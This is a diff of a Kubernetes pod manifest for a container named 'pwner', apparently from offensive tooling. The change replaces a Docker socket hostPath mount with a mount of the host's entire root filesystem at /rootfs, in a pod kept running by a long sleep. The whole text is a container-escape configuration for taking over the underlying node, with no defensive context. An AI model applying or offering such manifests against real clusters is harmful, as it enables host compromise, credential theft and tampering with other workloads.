@@ -10,13 +10,13 @@ spec:
   restartPolicy: Always
   containers:
   - name: pwner
-    image: docker
+    image: alpine
     imagePullPolicy: Always
     command: ["/bin/sleep", "9000"]
     volumeMounts:
-      - name: docker
-        mountPath: /var/run/docker.sock
+      - name: root
+        mountPath: /rootfs
   volumes:
-    - name: docker
+    - name: root
       hostPath:
-        path: /var/run/docker.sock
+        path: /
